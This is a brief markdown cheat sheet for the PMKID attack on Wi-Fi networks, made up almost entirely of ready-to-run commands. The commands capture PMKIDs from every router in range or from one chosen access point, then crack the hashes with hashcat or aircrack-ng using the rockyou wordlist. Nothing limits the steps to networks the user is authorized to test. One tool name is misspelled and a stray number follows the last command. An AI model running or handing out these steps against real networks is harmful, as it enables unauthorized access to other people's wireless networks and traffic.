# PMKID Attack

Routers vulnerable: Enabled roaming feature.

Tools: hcxtools, aircrack-ng suite

## Steps:

#### 1) Install hcxtools

    sudo apt install hcxtools

#### 2) Set our Wi-Fi adapter or NIC in monitor mode

    sudo airmon-ng start wlan0

#### 3) Capture PMKIDs from all the routers around us

    sudo hxcdumptool -o demo -i wlan0mon --enable_status 5

#### 4) Convert pcapng file to hashcat format

    sudo hcxpcaptool -z pmkidhash demo

#### 5) Crack hash

    hashcat -m 16800 --force pmkidhash /usr/share/wordlists/rockyou.txt --show

## Capture only a single PMKID

#### 1) Capture the PMKID from a single AP

    sudo hcxdumptool -o output -i wlan0mon --enable_status=1 --filterlist_ap=target --filtermode=2

#### 2) Convert pcapng file to hashcat format

    sudo hcxpcaptool -z pmkidhash output

#### 3) Crack hash

    hashcat -m 16800 --force pmkidhash /usr/share/wordlists/rockyou.txt --show

### Alternate method: Convert pcapng to pcap, then crack using Aircrack-ng

#### 1) Convert pcapng to pcap

    sudo tcpdump -r demo -w demo.pcap

#### 2) Crack file

    sudo aircrack-ng demo.pcap -w /usr/share/wordlists/rockyou.txt
    11

